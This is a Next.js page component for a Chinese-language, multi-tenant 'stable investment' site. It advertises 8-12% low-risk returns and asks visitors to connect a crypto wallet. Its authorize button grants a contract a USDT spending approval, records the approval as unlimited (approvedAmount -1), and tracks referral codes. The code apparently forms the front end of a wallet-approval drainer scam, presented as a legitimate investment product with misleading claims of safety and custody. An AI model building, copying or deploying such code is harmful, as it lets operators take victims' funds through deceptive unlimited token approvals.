'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { TenantPageProps } from '@/shared/types';
import { useWallet, useApprove, useReferral, useTenant } from '@/shared/hooks';
import { registerCustomer } from '@/shared/lib/api';
import { LoadingSpinner, ErrorDisplay, WalletButton } from '@/shared/components';

export function InvestPage({ tenantConfig }: TenantPageProps) {
  const router = useRouter();
  const { slug } = useTenant();
  const { isReady, isConnected, address, error: walletError } = useWallet();
  const { approve, isLoading: approving, error: approveError } = useApprove();
  const { referralCode } = useReferral();
  const [registering, setRegistering] = useState(false);
  const [error, setError] = useState<any>(null);

  const handleAuthorize = async () => {
    if (!isConnected || !address) return;

    try {
      setError(null);

      // 1. 授权 USDT
      const txHash = await approve(
        tenantConfig.investmentContractAddress,
        tenantConfig.usdtTokenAddress,
      );

      // 2. 注册客户
      setRegistering(true);
      await registerCustomer({
        walletAddress: address,
        approvedAmount: -1, // 无限额度
        approvalTxHash: txHash,
        referralCode: referralCode || undefined,
      });

      // 3. 导向成功页面
      router.push(`/${slug}/success`);
    } catch (err) {
      setError(err);
    } finally {
      setRegistering(false);
    }
  };

  if (!isReady) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-blue-50">
        <LoadingSpinner size="lg" />
      </div>
    );
  }

  const displayError = error || approveError || walletError;

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-blue-100 p-4">
      <div className="max-w-lg w-full bg-white rounded-xl shadow-xl p-8">
        {/* 页面标题 */}
        <div className="text-center mb-6">
          <h1 className="text-3xl font-bold text-gray-800 mb-2">
            稳健投资理财方案
          </h1>
          <p className="text-gray-600">
            专业团队管理，透明安全可信
          </p>
        </div>

        {/* 错误讯息 */}
        {displayError && (
          <div className="mb-6">
            <ErrorDisplay error={displayError} />
          </div>
        )}

        {/* 产品资讯卡片 */}
        <div className="mb-6 p-5 bg-blue-50 border border-blue-200 rounded-lg">
          <h3 className="text-sm font-semibold text-gray-700 mb-3">产品特点</h3>
          <div className="grid grid-cols-2 gap-4">
            <div>
              <p className="text-xs text-gray-600 mb-1">预期年化收益</p>
              <p className="text-lg font-bold text-blue-800">8-12%</p>
            </div>
            <div>
              <p className="text-xs text-gray-600 mb-1">投资门槛</p>
              <p className="text-lg font-bold text-blue-800">100 USDT 起</p>
            </div>
            <div>
              <p className="text-xs text-gray-600 mb-1">锁定期限</p>
              <p className="text-lg font-bold text-blue-800">灵活赎回</p>
            </div>
            <div>
              <p className="text-xs text-gray-600 mb-1">风险等级</p>
              <p className="text-lg font-bold text-blue-800">稳健型</p>
            </div>
          </div>
        </div>

        {/* 已连接钱包 */}
        {isConnected && address && (
          <div className="mb-6 p-4 bg-blue-50 border border-blue-200 rounded-lg">
            <p className="text-sm text-gray-600 mb-1">已连接钱包</p>
            <p className="text-sm font-mono text-gray-900 break-all">
              {address}
            </p>
          </div>
        )}

        {/* 推荐码显示 */}
        {referralCode && (
          <div className="mb-6 p-4 bg-amber-50 border border-amber-200 rounded-lg">
            <p className="text-sm text-amber-900">
              您正在使用推荐人邀请加入
            </p>
            <p className="text-sm mt-1">
              <span className="text-amber-700">推荐码: </span>
              <span className="font-semibold text-amber-900">{referralCode}</span>
            </p>
          </div>
        )}

        {/* 授权按钮 */}
        <WalletButton
          onClick={handleAuthorize}
          loading={approving || registering}
          disabled={!isConnected || approving || registering}
          className="w-full bg-blue-800 hover:bg-blue-900 text-white"
        >
          {approving ? '授权处理中...' : registering ? '开通账户中...' : '授权投资账户'}
        </WalletButton>

        {/* 安全提示 */}
        <p className="text-xs text-gray-500 text-center mt-4">
          授权后，您的 USDT 将由专业团队托管管理，可随时查看收益明细
        </p>
      </div>
    </div>
  );
}
